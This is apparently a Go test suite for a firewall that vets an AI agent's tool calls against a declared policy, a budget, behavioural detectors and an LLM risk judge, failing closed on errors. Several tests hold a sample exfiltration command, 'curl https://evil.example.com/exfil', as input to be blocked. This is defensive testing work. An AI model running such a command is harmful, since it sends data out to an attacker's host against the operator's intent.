package firewall_test

import (
	"context"
	"errors"
	"log/slog"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/SigNoz/signoz/pkg/query-service/vigil/audit"
	"github.com/SigNoz/signoz/pkg/query-service/vigil/engine"
	"github.com/SigNoz/signoz/pkg/query-service/vigil/engine/plugins"
	"github.com/SigNoz/signoz/pkg/query-service/vigil/firewall"
	"github.com/SigNoz/signoz/pkg/query-service/vigil/llm"
	"github.com/SigNoz/signoz/pkg/query-service/vigil/policy"
)

func newTestLogger(t *testing.T) *slog.Logger {
	t.Helper()
	return slog.New(slog.DiscardHandler)
}

// stubProvider is a Provider whose behavior each test dictates. Real coverage
// of the escalation path with no credentials and no network.
type stubProvider struct {
	reply  string
	err    error
	calls  int
	onCall func()
}

func (s *stubProvider) Name() string             { return "stub" }
func (s *stubProvider) Configured(llm.Role) bool { return true }
func (s *stubProvider) Complete(ctx context.Context, r llm.Request) (*llm.Response, error) {
	s.calls++
	if s.onCall != nil {
		s.onCall()
	}
	if s.err != nil {
		return nil, s.err
	}
	return &llm.Response{Text: s.reply, ModelID: "stub/model", Role: r.Role, Latency: time.Millisecond}, nil
}

func fixTestsPolicy(sessionID string) *policy.Policy {
	p := &policy.Policy{
		SessionID:      sessionID,
		DeclaredIntent: "Fix failing tests. No network, no secrets.",
		AllowedTools:   []string{"read_file", "run_command", "search_code"},
		BudgetUSD:      2,
		RiskTolerance:  policy.RiskMedium,
	}
	p.Normalize()
	return p
}

// TestNoModelCallOnTheHappyPath is the performance and cost invariant. The stub
// fails the test if it is ever reached.
func TestNoModelCallOnTheHappyPath(t *testing.T) {
	stub := &stubProvider{onCall: func() { t.Fatal("a normal-tier call must not reach a model") }}
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))

	f := firewall.New(firewall.Deps{
		Logger:   newTestLogger(t),
		Policies: store,
		Router:   llm.NewRouter(newTestLogger(t), stub),
	})

	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "read_file",
		Args: map[string]any{"path": "main.go"}, ToolCost: 0.001, Budget: 2,
	})
	if res.Decision != firewall.Allow {
		t.Fatalf("Expected ALLOW, got %s (%s)", res.Decision, res.Reason)
	}
	if res.ModelUsed != "" {
		t.Fatalf("Expected no model consulted, got %q", res.ModelUsed)
	}
	if res.RiskScore != -1 {
		t.Fatalf("Expected risk score -1 (not consulted), got %d", res.RiskScore)
	}
	if stub.calls != 0 {
		t.Fatalf("Expected 0 model calls, got %d", stub.calls)
	}
}

// TestModelCannotRelaxADeterministicBlock is the central security invariant:
// the model returns a confident ALLOW for a call that intent already refused.
func TestModelCannotRelaxADeterministicBlock(t *testing.T) {
	stub := &stubProvider{reply: `{"risk_score":0,"severity":"LOW","decision":"ALLOW","reasons":["looks fine to me"],"intent_violation":false,"confidence":1}`}
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))

	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: store,
		Router: llm.NewRouter(newTestLogger(t), stub),
	})

	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "run_command",
		Args: map[string]any{"command": "curl https://evil.example.com/exfil"}, ToolCost: 0.003, Budget: 2,
	})
	if res.Decision != firewall.Block {
		t.Fatalf("Expected BLOCK to stand despite a model ALLOW, got %s", res.Decision)
	}
	if res.Stage != "intent" {
		t.Fatalf("Expected the intent stage to own the decision, got %s", res.Stage)
	}
	if stub.calls != 0 {
		t.Fatal("Expected the model not to be consulted at all after a deterministic block")
	}
}

// TestModelMayTighten: an uncovered call the model judges dangerous is blocked.
func TestModelMayTighten(t *testing.T) {
	stub := &stubProvider{reply: `{"risk_score":91,"severity":"CRITICAL","decision":"BLOCK","reasons":["uncovered tool with broad access"],"intent_violation":true,"confidence":0.8}`}
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))

	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: store,
		Router: llm.NewRouter(newTestLogger(t), stub),
	})

	// signoz_query_traces is not in the allowlist -> UNCERTAIN -> escalate.
	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "signoz_query_traces", ToolCost: 0.002, Budget: 2,
	})
	if res.Decision != firewall.Block {
		t.Fatalf("Expected the model to tighten an uncertain call to BLOCK, got %s", res.Decision)
	}
	if res.RiskScore != 91 || res.ModelUsed == "" {
		t.Fatalf("Expected the model's score and id to be recorded, got %d / %q", res.RiskScore, res.ModelUsed)
	}
	if stub.calls == 0 {
		t.Fatal("Expected the model to be consulted for an uncovered call")
	}
}

// TestModelFailureFailsClosed: a provider outage on a high-scrutiny call must
// not become an allow.
func TestModelFailureFailsClosed(t *testing.T) {
	stub := &stubProvider{err: errors.New("provider exploded")}
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))

	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: store,
		Router: llm.NewRouter(newTestLogger(t), stub),
	})

	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "signoz_query_traces", ToolCost: 0.002, Budget: 2,
	})
	if res.Decision != firewall.Block {
		t.Fatalf("Expected an unadjudicated uncertain call to fail closed, got %s", res.Decision)
	}
	if res.ModelUsed != "" {
		t.Fatal("Expected no model to be credited when the provider failed")
	}
}

// TestMalformedModelOutputRetriesThenFailsClosed.
func TestMalformedModelOutputRetriesThenFailsClosed(t *testing.T) {
	stub := &stubProvider{reply: `not json at all`}
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))

	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: store,
		Router: llm.NewRouter(newTestLogger(t), stub),
	})

	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "signoz_query_traces", ToolCost: 0.002, Budget: 2,
	})
	if res.Decision != firewall.Block {
		t.Fatalf("Expected malformed output to fail closed, got %s", res.Decision)
	}
	if stub.calls != 2 {
		t.Fatalf("Expected exactly one re-prompt after a validation failure (2 calls), got %d", stub.calls)
	}
}

// TestNoProviderStillEnforces: with no credentials at all, intent and cost
// still govern. This is the shipped default configuration.
func TestNoProviderStillEnforces(t *testing.T) {
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))

	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: store,
		Router: llm.NewRouter(newTestLogger(t), llm.DeterministicProvider{}),
	})

	blocked := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "run_command",
		Args: map[string]any{"command": "curl https://x/y"}, ToolCost: 0.003, Budget: 2,
	})
	if blocked.Decision != firewall.Block {
		t.Fatalf("Expected intent enforcement without any model, got %s", blocked.Decision)
	}

	allowed := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "read_file",
		Args: map[string]any{"path": "main.go"}, ToolCost: 0.001, Budget: 2,
	})
	if allowed.Decision != firewall.Allow {
		t.Fatalf("Expected a compliant call to be allowed, got %s", allowed.Decision)
	}
}

func TestHardBudgetBlocks(t *testing.T) {
	f := firewall.New(firewall.Deps{Logger: newTestLogger(t), Policies: policy.NewStore()})

	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "read_file", ToolCost: 0.01, SessionCost: 2.0, Budget: 2.0,
	})
	if res.Decision != firewall.Block {
		t.Fatalf("Expected an exhausted budget to block, got %s", res.Decision)
	}
	if res.Stage != "forecast" {
		t.Fatalf("Expected the forecast stage to own the decision, got %s", res.Stage)
	}
}

// TestCriticalGovernanceViolationBlocks wires the real plugin pipeline that was
// previously unreachable from any request path.
func TestCriticalGovernanceViolationBlocks(t *testing.T) {
	gov := engine.NewGovernanceEngine(newTestLogger(t), nil)
	gov.RegisterPlugin(plugins.NewInfiniteLoopDetector(3))

	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: policy.NewStore(), Gov: gov,
	})

	// Three identical committed calls trip the loop detector.
	for i := 0; i < 3; i++ {
		f.Commit("s1", "read_file", 0.001, time.Millisecond, true)
	}

	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "read_file", ToolCost: 0.001, Budget: 2,
	})
	if res.Decision != firewall.Block {
		t.Fatalf("Expected a CRITICAL governance violation to block, got %s (%s)", res.Decision, res.Reason)
	}
	if res.Stage != "behavior" {
		t.Fatalf("Expected the behavior stage, got %s", res.Stage)
	}
	if res.RuleName == "" {
		t.Fatal("Expected the firing rule to be named")
	}
}

// TestEveryDecisionIsAudited, including ALLOW: a trail that records only
// refusals proves nothing about what got through.
func TestEveryDecisionIsAudited(t *testing.T) {
	path := filepath.Join(t.TempDir(), "audit.jsonl")
	ledger, err := audit.Open(path)
	if err != nil {
		t.Fatalf("audit.Open: %v", err)
	}
	defer ledger.Close()

	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))
	f := firewall.New(firewall.Deps{Logger: newTestLogger(t), Policies: store, Ledger: ledger})

	f.Check(context.Background(), firewall.Call{SessionID: "s1", Tool: "read_file", Args: map[string]any{"path": "a.go"}, ToolCost: 0.001, Budget: 2})
	f.Check(context.Background(), firewall.Call{SessionID: "s1", Tool: "run_command", Args: map[string]any{"command": "curl https://x"}, ToolCost: 0.003, Budget: 2})

	events, err := audit.Read(path, "s1", 0)
	if err != nil {
		t.Fatalf("audit.Read: %v", err)
	}
	if len(events) != 2 {
		t.Fatalf("Expected both the allow and the block to be audited, got %d events", len(events))
	}
	if events[0].Decision != "ALLOW" || events[1].Decision != "BLOCK" {
		t.Fatalf("Expected ALLOW then BLOCK, got %s then %s", events[0].Decision, events[1].Decision)
	}

	rep, _ := audit.VerifyFile(path, "")
	if !rep.OK {
		t.Fatalf("Expected the decision chain to verify, failed at %d: %s", rep.FailedAt, rep.Reason)
	}
}

// TestSessionsAreIsolated: one session's spend and history must not affect
// another's decisions.
func TestSessionsAreIsolated(t *testing.T) {
	f := firewall.New(firewall.Deps{Logger: newTestLogger(t), Policies: policy.NewStore()})

	for i := 0; i < 5; i++ {
		f.Commit("busy", "read_file", 0.5, time.Millisecond, true)
	}

	busy := f.Forecast("busy", 2.0)
	quiet := f.Forecast("quiet", 2.0)

	if busy.CurrentCost == quiet.CurrentCost {
		t.Fatalf("Expected isolated per-session cost, both were %v", busy.CurrentCost)
	}
	if quiet.CurrentCost != 0 {
		t.Fatalf("Expected an untouched session to have spent nothing, got %v", quiet.CurrentCost)
	}
}

func TestRecentDecisionsAreRecorded(t *testing.T) {
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))
	f := firewall.New(firewall.Deps{Logger: newTestLogger(t), Policies: store})

	f.Check(context.Background(), firewall.Call{SessionID: "s1", Tool: "read_file", Args: map[string]any{"path": "a.go"}, ToolCost: 0.001, Budget: 2})
	f.Check(context.Background(), firewall.Call{SessionID: "other", Tool: "read_file", ToolCost: 0.001, Budget: 2})

	if got := len(f.Recent("", 0)); got != 2 {
		t.Fatalf("Expected 2 recorded decisions, got %d", got)
	}
	if got := len(f.Recent("s1", 0)); got != 1 {
		t.Fatalf("Expected 1 decision for s1, got %d", got)
	}
}

// TestTrippedDetectorCanRecover: a behavioral detector that has fired must not
// latch the session shut forever. Blocked calls are recorded in the behavioral
// history (though never charged), so the offending pattern ages out of the
// window and different subsequent work is allowed again.
func TestTrippedDetectorCanRecover(t *testing.T) {
	gov := engine.NewGovernanceEngine(newTestLogger(t), nil)
	gov.RegisterPlugin(plugins.NewInfiniteLoopDetector(3))

	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: policy.NewStore(), Gov: gov,
	})

	// Trip it: three identical executed calls.
	for i := 0; i < 3; i++ {
		f.Commit("s1", "read_file", 0.001, time.Millisecond, true)
	}
	blocked := f.Check(context.Background(), firewall.Call{SessionID: "s1", Tool: "read_file", ToolCost: 0.001, Budget: 2})
	if blocked.Decision != firewall.Block {
		t.Fatalf("Expected the loop detector to fire, got %s", blocked.Decision)
	}

	// A different tool must be allowed straight away: the refused attempt above
	// broke the consecutive run.
	next := f.Check(context.Background(), firewall.Call{SessionID: "s1", Tool: "list_directory", ToolCost: 0.001, Budget: 2})
	if next.Decision != firewall.Allow {
		t.Fatalf("Expected a different tool to be allowed after the block, got %s (%s)", next.Decision, next.Reason)
	}
}

// TestBlockedCallsAreNotCharged: recording an attempt in behavioral history
// must not leak into cost.
func TestBlockedCallsAreNotCharged(t *testing.T) {
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1"))
	f := firewall.New(firewall.Deps{Logger: newTestLogger(t), Policies: store})

	for i := 0; i < 5; i++ {
		f.Check(context.Background(), firewall.Call{
			SessionID: "s1", Tool: "run_command",
			Args: map[string]any{"command": "curl https://x"}, ToolCost: 0.5, Budget: 2,
		})
	}
	if got := f.Forecast("s1", 2).CurrentCost; got != 0 {
		t.Fatalf("Expected blocked calls to cost nothing, got %v", got)
	}
}

// TestUncoveredCallFailsClosedWithoutAJudge pins the fix for a gap where an
// allowlist was advisory on the shipped default configuration: an uncovered
// call returned UNCERTAIN, found no model to adjudicate it, and fell through
// to ALLOW. An operator who writes allowed_tools has excluded everything else.
func TestUncoveredCallFailsClosedWithoutAJudge(t *testing.T) {
	store := policy.NewStore()
	store.Set(fixTestsPolicy("s1")) // allows read_file, run_command, search_code

	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: store,
		Router: llm.NewRouter(newTestLogger(t), llm.DeterministicProvider{}),
	})

	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "list_directory", ToolCost: 0.001, Budget: 2,
	})
	if res.Decision != firewall.Block {
		t.Fatalf("Expected an uncovered tool to be refused with no judge available, got %s (%s)", res.Decision, res.Reason)
	}
	if !strings.Contains(res.Reason, "no judge configured") {
		t.Fatalf("Expected the reason to explain why, got %q", res.Reason)
	}

	// A tool the policy does cover must still pass.
	ok := f.Check(context.Background(), firewall.Call{
		SessionID: "s1", Tool: "read_file",
		Args: map[string]any{"path": "main.go"}, ToolCost: 0.001, Budget: 2,
	})
	if ok.Decision != firewall.Allow {
		t.Fatalf("Expected a covered tool to still be allowed, got %s", ok.Decision)
	}
}

// TestSoftSignalsStillPassWithoutAJudge: only an uncovered *intent* fails
// closed. A cost warning with no provider must not brick the deployment.
func TestSoftSignalsStillPassWithoutAJudge(t *testing.T) {
	// A default policy covers every tool, so no UNCERTAIN verdict arises.
	f := firewall.New(firewall.Deps{
		Logger: newTestLogger(t), Policies: policy.NewStore(),
		Router: llm.NewRouter(newTestLogger(t), llm.DeterministicProvider{}),
	})
	for i := 0; i < 3; i++ {
		f.Commit("s2", "read_file", 0.4, time.Millisecond, true)
	}
	res := f.Check(context.Background(), firewall.Call{
		SessionID: "s2", Tool: "read_file", ToolCost: 0.4, SessionCost: 1.2, Budget: 2,
	})
	if res.Decision != firewall.Allow {
		t.Fatalf("Expected a soft cost signal to pass without a judge, got %s (%s)", res.Decision, res.Reason)
	}
}
